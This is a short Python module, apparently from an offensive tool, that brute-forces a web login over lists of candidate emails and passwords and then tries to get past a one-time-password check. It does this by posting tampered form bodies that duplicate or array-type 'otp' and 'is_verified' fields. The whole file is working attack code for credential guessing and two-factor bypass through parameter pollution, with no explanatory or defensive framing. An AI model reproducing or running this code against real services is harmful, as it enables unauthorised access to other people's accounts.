from __future__ import annotations

from dataclasses import dataclass

from .extractors import try_parse_json
from .http_client import HttpClient


@dataclass
class AuthContext:
    email: str
    password: str
    otp_bypassed: bool


def try_login(client: HttpClient, email: str, password: str) -> bool:
    client.request("GET", "login.php")
    response = client.request(
        "POST",
        "api_login.php",
        data={"email": email, "password": password},
    )
    data = try_parse_json(response.text)
    if not data:
        return False
    return bool(data.get("ok")) and str(data.get("redirect", "")).lower().endswith("otp.php")


def otp_tamper_bypass(client: HttpClient) -> bool:
    payloads = [
        "otp=000000&is_verified=true&is_verified=1&is_verified[]=",
        "otp=000000&verified=1&is_verified[]=1",
        "otp=000000&otp=111111&is_verified=1",
    ]

    for body in payloads:
        response = client.request(
            "POST",
            "verify_otp.php",
            data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        data = try_parse_json(response.text)
        if data and data.get("ok") is True:
            return True

    return False


def authenticate_with_candidates(
    client: HttpClient,
    emails: list[str],
    passwords: list[str],
) -> AuthContext | None:
    for email in emails:
        for password in passwords:
            client.session.cookies.clear()
            if not try_login(client, email, password):
                continue
            bypassed = otp_tamper_bypass(client)
            if bypassed:
                return AuthContext(email=email, password=password, otp_bypassed=True)
    return None
